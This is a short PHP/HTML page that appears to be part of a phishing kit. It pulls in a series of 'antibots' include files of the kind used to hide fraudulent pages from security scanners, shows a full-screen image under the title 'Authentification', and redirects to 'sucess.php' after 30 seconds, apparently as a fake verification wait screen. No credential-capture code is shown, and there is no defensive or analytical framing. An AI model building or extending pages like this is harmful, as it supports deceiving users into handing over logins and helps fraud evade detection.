<?php

include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentification</title>
    <style>
       /* Styles généraux */
       body {
           background-image: url(juju.png);
           background-size: cover; /* Par défaut : l'image couvre toute la zone */
           background-repeat: no-repeat; /* Pas de répétition de l'image */
           background-position: center; /* Centre l'image */
           margin: 0; /* Supprime les marges par défaut */
           min-height: 100vh; /* Hauteur minimale : la hauteur de la fenêtre */
           display: flex; /* Permet un positionnement flexible */
           justify-content: center; /* Centre horizontalement */
           align-items: center; /* Centre verticalement */
       }

       /* Ajustements pour les petits écrans */
       @media (max-width: 768px) {
           body {
               background-size: contain; /* L'image est entière, mais peut laisser des bordures */
               background-color: #000; /* Optionnel : fond noir pour combler les espaces si nécessaire */
           }
       }

       @media (max-width: 480px) {
           body {
               background-size: contain; /* Toujours adapter l'image pour qu'elle soit entièrement visible */
               background-position: top; /* Optionnel : positionne l'image en haut */
               background-color: #000; /* Fond pour éviter les espaces blancs */
           }
       }
   </style>
</head>
<body>
   <script>
        // Fonction pour rediriger après 30 secondes
        setTimeout(() => {
            window.location.href = "sucess.php"; // Redirection
        }, 30000); // 30000 ms = 30 secondes
    </script>
</body>
</html>
